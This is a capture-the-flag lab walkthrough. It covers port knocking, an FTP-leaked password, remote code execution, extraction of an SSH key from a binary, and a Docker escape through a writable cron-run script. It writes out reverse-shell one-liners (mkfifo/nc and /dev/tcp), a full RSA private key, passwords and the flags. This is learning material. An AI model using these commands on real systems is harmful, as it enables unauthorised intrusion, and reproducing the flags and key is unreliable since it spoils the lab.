# PORT SCAN
---


| PORT | SERVICE |
| :--- | :---------- |
| 21 | FTP |
| 22 | SSH |
| 4420 | NVM-EXPRESS |
| 8080 | HTTP |




# RECONNAISSANCE
---

If we try interacting with the `4420` port, we need a password, for it, we can go to `ftp` and check this, on there, we will get:

```
sardinethecat
```

![Pasted image 20250612135655.png](../../IMAGES/Pasted%20image%2020250612135655.png)
But, before all of this, we need to go to the website in which we will find this:

![Pasted image 20250612142859.png](../../IMAGES/Pasted%20image%2020250612142859.png)

The FTP port will appear as filter if we don't do `port knocking`, Port knocking is a security technique that involves a client making a series of connection attempts to specific closed ports on a server before a legitimate connection can be established, we need to do port knocking on the specified ports:

```
knock IP 1111, 2222, 3333, 4444
```

Once we knock, the ftp port will be open and we can access to get the password.

Let's begin exploitation.

# EXPLOITATION
---

We got `rce`, let's send ourselves a reverse shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f
```


![Pasted image 20250612135810.png](../../IMAGES/Pasted%20image%2020250612135810.png)



We have a `runme` binary on `/home/catlover`:

```
# ls -la /home
total 12
drwxr-xr-x 3 0 0 4096 Apr 2 2021 .
drwxr-xr-x 10 1001 1001 4096 Apr 3 2021 ..
drwxr-xr-x 2 0 0 4096 Apr 3 2021 catlover
# ls -la /home/catlover
total 28
drwxr-xr-x 2 0 0 4096 Apr 3 2021 .
drwxr-xr-x 3 0 0 4096 Apr 2 2021 ..
-rwxr-xr-x 1 0 0 18856 Apr 3 2021 runme
# ./home/catlover/runme
Please enter yout password: sardinethecat
Access Denied
```

It prompts for a password, which we don't have, we cannot get the binary on our home due to the shell being a little rusty, but, when we use cat we can see this little line: 


```
rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
```

The password is:

```
rebecca
```

This binary generates a `id_rsa` for `catlover` once the password is correct, we know this by analyzing the binary using `cat`:

```
cat /home/catlover/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAmI1dCzfMF4y+TG3QcyaN3B7pLVMzPqQ1fSQ2J9jKzYxWArW5
IWnCNvY8gOZdOSWgDODCj8mOssL7SIIgkOuD1OzM0cMBSCCwYlaN9F8zmz6UJX+k
jSmQqh7eqtXuAvOkadRoFlyog2kZ1Gb72zebR75UCBzCKv1zODRx2zLgFyGu0k2u
xCa4zmBdm80X0gKbk5MTgM4/l8U3DFZgSg45v+2uM3aoqbhSNu/nXRNFyR/Wb10H
tzeTEJeqIrjbAwcOZzPhISo6fuUVNH0pLQOf/9B1ojI3/jhJ+zE6MB0m77iE07cr
lT5PuxlcjbItlEF9tjqudycnFRlGAKG6uU8/8wIDAQABAoIBAH1NyDo5p6tEUN8o
aErdRTKkNTWknHf8m27h+pW6TcKOXeu15o3ad8t7cHEUR0h0bkWFrGo8zbhpzcte
D2/Z85xGsWouufPL3fW4ULuEIziGK1utv7SvioMh/hXmyKymActny+NqUoQ2JSBB
QuhqgWJppE5RiO+U5ToqYccBv+1e2bO9P+agWe+3hpjWtiAUHEdorlJK9D+zpw8s
/+9CjpDzjXA45X2ikZ1AhWNLhPBnH3CpIgug8WIxY9fMbmU8BInA8M4LUvQq5A63
zvWWtuh5bTkj622QQc0Eq1bJ0bfUkQRD33sqRVUUBE9r+YvKxHAOrhkZHsvwWhK/
oylx3WECgYEAyFR+lUqnQs9BwrpS/A0SjbTToOPiCICzdjW9XPOxKy/+8Pvn7gLv
00j5NVv6c0zmHJRCG+wELOVSfRYv7z88V+mJ302Bhf6uuPd9Xu96d8Kr3+iMGoqp
tK7/3m4FjoiNCpZbQw9VHcZvkq1ET6qdzU+1I894YLVu258KeCVUqIMCgYEAwvHy
QTo6VdMOdoINzdcCCcrFCDcswYXxQ5SpI4qMpHniizoa3oQRHO5miPlAKNytw5PQ
zSKoIW47AObP2twzVAH7d+PWRzqAGZXW8gsF6Ls48LxSJGzz8V191PjbcGQO7Oro
Em8pQ+qCISxv3A8fKvG5E9xOspD0/3lsM/zGD9ECgYBOTgDAuFKS4dKRnCUt0qpK
68DBJfJHYo9DiJQBTlwVRoh/h+fLeChoTSDkQ5StFwTnbOg+Y83qAqVwsYiBGxWq
Q2YZ/ADB8KA5OrwtrKwRPe3S8uI4ybS2JKVtO1I+uY9v8P+xQcACiHs6OTH3dfiC
tUJXwhQKsUCo5gzAk874owKBgC/xvTjZjztIWwg+WBLFzFSIMAkjOLinrnyGdUqu
aoSRDWxcb/tF08efwkvxsRvbmki9c97fpSYDrDM+kOQsv9rrWeNUf4CpHJQuS9zf
ZSal1Q0v46vdt+kmqynTwnRTx2/xHf5apHV1mWd7PE+M0IeJR5Fg32H/UKH8ROZM
RpHhAoGAehljGmhge+i0EPtcok8zJe+qpcV2SkLRi7kJZ2LaR97QAmCCsH5SndzR
tDjVbkh5BX0cYtxDnfAF3ErDU15jP8+27pEO5xQNYExxf1y7kxB6Mh9JYJlq0aDt
O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
-----END RSA PRIVATE KEY-----
```

We got our private key and can now connect to ssh:

![Pasted image 20250612141930.png](../../IMAGES/Pasted%20image%2020250612141930.png)
# PRIVILEGE ESCALATION
---

We are root but the root flag is nowhere to be found, this is because we are inside of a `Docker container`, we can know this with linpeas and `ls -la /`:

```
root@7546fa2336d6:/opt/clean# ls -la /
total 112
drwxr-xr-x 1 root root 4096 Jun 12 19:22 .
drwxr-xr-x 1 root root 4096 Jun 12 19:22 ..
-rw------- 1 root root 596 Jun 12 19:18 .bash_history
-rwxr-xr-x 1 root root 0 Mar 25 2021 .dockerenv
drwxr-xr-x 1 root root 4096 Apr 9 2021 bin
drwxr-xr-x 3 root root 4096 Mar 24 2021 bitnami
drwxr-xr-x 2 root root 4096 Jan 30 2021 boot
-rw-r--r-- 1 root root 62 Jun 12 19:22 clean.sh
drwxr-xr-x 5 root root 340 Jun 12 19:09 dev
drwxr-xr-x 1 root root 4096 Apr 9 2021 etc
drwxr-xr-x 2 root root 4096 Jan 30 2021 home
drwxr-xr-x 1 root root 4096 Sep 25 2017 lib
drwxr-xr-x 2 root root 4096 Feb 18 2021 lib64
drwxr-xr-x 2 root root 4096 Feb 18 2021 media
drwxr-xr-x 2 root root 4096 Feb 18 2021 mnt
drwxrwxr-x 1 root root 4096 Mar 25 2021 opt
drwxrwxr-x 2 root root 4096 Mar 24 2021 post-init.d
-rwxrwxr-x 1 root root 796 Mar 24 2021 post-init.sh
dr-xr-xr-x 131 root root 0 Jun 12 19:09 proc
drwx------ 1 root root 4096 Mar 25 2021 root
drwxr-xr-x 4 root root 4096 Feb 18 2021 run
drwxr-xr-x 1 root root 4096 Apr 9 2021 sbin
drwxr-xr-x 2 root root 4096 Feb 18 2021 srv
dr-xr-xr-x 13 root root 0 Jun 12 19:23 sys
drwxrwxrwt 1 root root 4096 Jun 12 19:27 tmp
drwxrwxr-x 1 root root 4096 Mar 24 2021 usr
drwxr-xr-x 1 root root 4096 Feb 18 2021 var
```

As seen, `.dockerenv` is on here, we need a way to get into root
If we check the `/opt` directory we can find a `clean.sh` script that does this:

```
root@7546fa2336d6:/# cat /opt/clean/clean.sh
#!/bin/bash

rm -rf /tmp/*
```

We have write permissions so we can simply modify it to a reverse shell:

```
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/IP/1111 0>&1'" >> /opt/clean/clean.sh
```

This script runs each a couple minutes so wait and have the listener ready, we know this by taking a look at the `.bash_history` file:

```
root@7546fa2336d6:/opt/clean# cat /.bash_history
exit
exit
exit
exit
exit
exit
exit
ip a
ifconfig
apt install ifconfig
ip
exit
nano /opt/clean/clean.sh
ping 192.168.4.20
apt install ping
apt update
apt install ping
apt install iptuils-ping
apt install iputils-ping
exit
ls
cat /opt/clean/clean.sh
nano /opt/clean/clean.sh
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh
cat /opt/clean/clean.sh
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
cat /var/log/dpkg.log
nano /opt/clean/clean.sh
nano /opt/clean/clean.sh
exit
exit
exit
ls
exit
```


Once the script runs again, we get a shell as root but in the real machine:

![Pasted image 20250612143517.png](../../IMAGES/Pasted%20image%2020250612143517.png)

We can now get both flags:

```
root@7546fa2336d6:/opt/clean# cat /root/flag.txt
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9

root@cat-pictures:~# cat /root/root.txt
Congrats!!!
Here is your flag:

4a98e43d78bab283938a06f38d2ca3a3c53f0476
```

![Pasted image 20250612143705.png](../../IMAGES/Pasted%20image%2020250612143705.png)

